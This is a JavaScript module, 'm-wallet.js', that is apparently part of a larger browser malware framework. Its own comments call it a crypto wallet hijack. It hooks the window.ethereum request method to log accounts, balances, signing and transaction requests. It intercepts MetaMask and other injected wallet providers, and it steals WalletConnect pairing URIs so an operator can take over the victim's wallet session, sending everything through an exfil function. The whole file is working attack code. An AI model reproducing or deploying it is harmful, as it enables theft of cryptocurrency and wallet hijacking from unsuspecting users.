/* m-wallet.js — Crypto wallet hijack (EIP-1193 + WalletConnect). 0% cobertura en el FOOT.
   Hook window.ethereum.request, captura accounts/balance/signing/tx; roba URI pairing de WalletConnect. */
(function(G){
if(!G)return; if(G._M&&G._M.wallet)return; G._M=G._M||{}; G._M.wallet=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
function cap(label,data){try{exfil('wallet-'+label,data)}catch(e){}}
try{
function hookProvider(p,src){
if(!p||p.__geHooked)return; p.__geHooked=1;
var orig=p.request&&p.request.bind(p);
if(orig)p.request=function(args){
try{if(args&&args.method){
var m=args.method,params=args.params||[];
if(/eth_accounts|eth_coinbase|eth_getBalance|personal_sign|eth_signTypedData|eth_sendTransaction|wallet_requestPermissions/i.test(m)){
cap('req',{src:src,method:m,params:JSON.stringify(params).slice(0,500)});
if(m==='eth_accounts')Promise.resolve(orig(args)).then(function(a){if(a&&a.length)cap('accounts',{src:src,accounts:a})}).catch(function(){});
if(m==='eth_getBalance'&&params[0])Promise.resolve(orig(args)).then(function(b){cap('balance',{src:src,addr:params[0],bal:String(b).slice(0,40)})}).catch(function(){});
}}
}catch(e){}
return orig.apply(this,arguments)};
}
hookProvider(window.ethereum,'global');
// capturar carga diferida (MetaMask inyecta ethereum tras load)
var _eth;
try{Object.defineProperty(window,'ethereum',{configurable:true,
get:function(){return _eth},
set:function(v){_eth=v;if(v){cap('provider-detected',{isMetaMask:!!v.isMetaMask,isCoinbase:!!v.isCoinbase,isTrust:!!v.isTrust,isMetaMaskRails:!!v.isMetaMaskRails,chainId:v.chainId});hookProvider(v,'injected')}}})}catch(e){}
// WalletConnect: robar URI pairing (wc:) → sesionar la wallet del operador
function hookWC(C){if(!C||C.__geHooked)return;C.__geHooked=1;var orig=C.bind(C);
var _origConnect=C.prototype.connect&&C.prototype.connect.bind(C.prototype);
if(C.prototype.connect)C.prototype.connect=function(opts){try{if(opts&&opts.pairingUri)cap('wc-uri',{uri:opts.pairingUri});else if(_eth&&_eth.walletURI)cap('wc-uri',{uri:_eth.walletURI})}catch(e){};return _origConnect(opts)}}
if(window.WalletConnect)hookWC(window.WalletConnect);
var _wc;try{Object.defineProperty(window,'WalletConnect',{configurable:true,get:function(){return _wc},set:function(v){_wc=v;hookWC(v)}})}catch(e){}
cap('boot',{hasEthereum:!!window.ethereum,hasWeb3:!!window.web3,hasWC:!!window.WalletConnect});
}catch(e){hx('m-wallet-err',{m:e.message})}
})(window.__GE__);
